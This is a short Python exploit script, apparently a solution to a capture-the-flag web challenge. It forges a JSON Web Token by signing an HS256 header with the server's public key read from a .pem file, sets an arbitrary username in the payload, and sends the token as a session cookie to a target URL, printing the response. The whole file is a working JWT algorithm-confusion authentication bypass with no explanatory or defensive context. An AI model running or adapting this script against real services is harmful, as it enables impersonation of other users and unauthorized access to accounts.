#!/usr/bin/python3


import sys
import hmac
import hashlib
import base64
import json
import requests



def exploit(base_url: str, username: str) -> None:

    sess = requests.session()

    with open("underconstruction.pem", "r") as file:
        secret_key = file.read()
    header = json.dumps({"alg":"HS256","typ":"JWT"}).encode()

    payload = json.dumps({
        "username":username,
        "pk":secret_key,
        "iat":1641104704
    }).encode()


    b64_header = base64.urlsafe_b64encode(header).decode().rstrip("=")
    b64_payload = base64.urlsafe_b64encode(payload).decode().rstrip("=")

    signature = hmac.new(
        key=secret_key.encode(),
        msg=f'{b64_header}.{b64_payload}'.encode(),
        digestmod=hashlib.sha256
    ).digest()

    JWT = f'{b64_header}.{b64_payload}.{base64.urlsafe_b64encode(signature).decode()}'

    headers = {
    'session': JWT.rstrip("=")
    }

    response = requests.get(url=base_url, cookies = headers)
    print(response.text)


def main():

    try:
        base_url, username = sys.argv[1], sys.argv[2]
        exploit(base_url, username)
    except:
        pass




if __name__ == "__main__":
    main()






